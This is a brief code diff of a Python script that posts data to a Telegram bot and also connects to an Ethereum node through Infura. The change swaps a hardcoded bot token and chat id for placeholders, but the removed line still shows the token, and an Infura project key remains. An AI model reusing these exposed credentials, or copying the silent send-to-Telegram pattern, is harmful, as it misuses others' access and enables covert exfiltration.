@@ -6,7 +6,9 @@ from colorama import init, Fore, Back, Style
 import random
 init()
 def snd2tg(data):
-    tg = 'https://api.telegram.org/bot6550086748:AAFPn9FRbWRXz3pKvllhkpy6cTkkwnRKtZ8/sendMessage?chat_id=1935904246&text='
+    token="tg bot token"
+    id="yout id"
+    tg = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text='
     requests.get(tg + data)
 
 infura_url = "https://mainnet.infura.io/v3/4e779a6e40c14cfabd41fcc6a612e413"
